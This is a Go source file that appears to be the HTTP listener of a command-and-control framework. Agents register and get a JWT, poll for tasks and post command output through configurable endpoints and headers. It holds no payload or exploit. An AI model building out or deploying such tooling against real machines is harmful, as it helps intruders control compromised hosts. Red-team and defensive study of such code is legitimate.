package server

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"strconv"
	"strings"

	"github.com/execute-assembly/c2-proj/server/internal/config"

	"github.com/go-chi/chi/v5"
)

const (
	COMMAND_TYPE_REGISTER = 50
	COMMAND_GET_TASK      = 51
	COMMAND_POST_OUTPUT   = 52
)

func StartServer() {
	r := chi.NewRouter()
	r.Post(config.Cfg.PostEndpoint, PostHandler)
	r.Get(config.Cfg.GetEndpoint, getHandler)
	http.ListenAndServe(fmt.Sprintf("%s:%d", config.Cfg.Host, config.Cfg.Port), r)
}

func checkToken(token string) (string, error) {
	if token == "" {
		return "", errors.New("No Token Found")
	}

	Guid, err := VerifyToken(token)
	if err != nil {
		return "", errors.New("No Token Found")
	}

	return Guid, nil

}

func PostHandler(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed", http.StatusInternalServerError)
		return
	}

	reader := bytes.NewReader(body)
	var commandType uint32
	if err := binary.Read(reader, binary.LittleEndian, &commandType); err != nil {
		http.NotFound(w, r)
		return
	}

	switch commandType {
	case COMMAND_TYPE_REGISTER:
		ip, _, _ := net.SplitHostPort(r.RemoteAddr)
		jwtBytes, err := NewClientRegisterHandler(ip, reader)
		if err != nil {
			http.Error(w, "Failed", http.StatusInternalServerError)
			return
		}
		writeResponse(w, config.Cfg.PostHeaders, jwtBytes)
	case COMMAND_POST_OUTPUT:
		tokenStr := extractBearer(r)
		AgentGuid, err := checkToken(tokenStr)
		if err != nil {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		if err := HandlePostOutput(AgentGuid, reader); err != nil {
			http.Error(w, "", http.StatusInternalServerError)
			return
		} else {
			http.Error(w, "", http.StatusNoContent)
			return
		}

	}
}

func extractBearer(r *http.Request) string {
	return strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
}

func writeResponse(w http.ResponseWriter, headers []config.Header, body []byte) {
	for _, h := range headers {
		w.Header().Set(h.Name, h.Value)
	}
	w.Write(body)
}

func getHandler(w http.ResponseWriter, r *http.Request) {
	typeStr := r.URL.Query().Get(config.Cfg.GetTypeParam)
	if typeStr == "" {
		http.NotFound(w, r)
		return
	}

	commandType, err := strconv.ParseUint(typeStr, 10, 32)
	if err != nil {
		http.NotFound(w, r)
		return
	}

	tokenStr := extractBearer(r)
	AgentGuid, err := checkToken(tokenStr)
	if err != nil {
		http.Error(w, "UnAuthorised", http.StatusUnauthorized)
		return
	}

	switch uint32(commandType) {
	case COMMAND_GET_TASK:
		commandBytes, err := GetTaskHandler(AgentGuid)
		if err != nil {
			http.Error(w, "Failed", http.StatusInternalServerError)
			return
		}
		if len(commandBytes) == 0 {
			w.WriteHeader(http.StatusCreated)
			return
		}
		writeResponse(w, config.Cfg.GetHeaders, commandBytes)
	}
}
